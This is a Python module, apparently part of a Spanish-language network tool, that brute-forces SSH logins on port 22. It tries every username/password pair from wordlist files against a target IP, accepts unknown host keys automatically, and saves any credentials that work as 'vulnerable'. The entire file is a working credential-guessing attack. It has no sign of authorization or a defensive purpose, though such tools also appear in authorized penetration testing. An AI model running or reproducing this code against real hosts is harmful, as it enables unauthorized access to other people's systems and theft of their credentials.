import paramiko
import logging
import socket
import os
from modules.utils import guardar_vulnerable, cargar_lista
from paramiko.ssh_exception import SSHException, NoValidConnectionsError, AuthenticationException

# Silenciar mensajes internos de Paramiko
logging.getLogger("paramiko").setLevel(logging.WARNING)

def verificar_ssh(ip):
    if not os.path.exists("usuarios.txt") or not os.path.exists("passwords.txt"):
        print("[!] Error: archivos 'usuarios.txt' o 'passwords.txt' no encontrados.")
        return False

    usuarios = cargar_lista("usuarios.txt")
    passwords = cargar_lista("passwords.txt")

    if not usuarios or not passwords:
        print("[!] Error: 'usuarios.txt' o 'passwords.txt' están vacíos.")
        return False

    for usuario in usuarios:
        for clave in passwords:
            try:
                print(f"[*] Probing {ip} SSH with {usuario}/{clave}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=usuario, password=clave, timeout=10)
                print(f"[✔] ¡ACCESO SSH EXITOSO! {ip} ({usuario}/{clave})")
                guardar_vulnerable(ip, "ssh", usuario, clave)
                ssh.close()
                return True
            except AuthenticationException:
                print(f"[✗] Autenticación fallida en {ip} con {usuario}/{clave}")
            except NoValidConnectionsError:
                print(f"[!] Puerto 22 cerrado o inaccesible en {ip}")
                return False
            except (SSHException, EOFError, socket.timeout, ConnectionResetError) as e:
                print(f"[!] SSHException en {ip}: {e}")
            except Exception as e:
                print(f"[!] Excepción inesperada en {ip}: {e}")
    print(f"[-] No se pudo acceder a SSH en {ip}")
    return False
